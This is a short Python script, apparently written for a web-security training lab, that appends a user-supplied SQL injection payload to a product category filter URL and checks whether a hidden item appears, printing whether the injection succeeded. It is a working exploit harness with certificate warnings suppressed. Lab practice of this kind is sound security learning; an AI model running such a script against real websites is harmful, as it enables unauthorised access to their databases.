import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit_sqli (url,payload) : 
    uri = '/filter?category=Gifts'
    response = requests.get(url+uri+payload)
    if "Pest Control Umbrella" in  response.text :
        return True
    else :
        return False

if __name__ == "__main__" :
    try :
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print(" Usage: %s <url> <payload>" % sys.argv[0])
        sys.exit(-1)
    
    if exploit_sqli(url,payload) :
        print("SQLi successful ! ")
    else :
        print("SQLi unsuccessful ")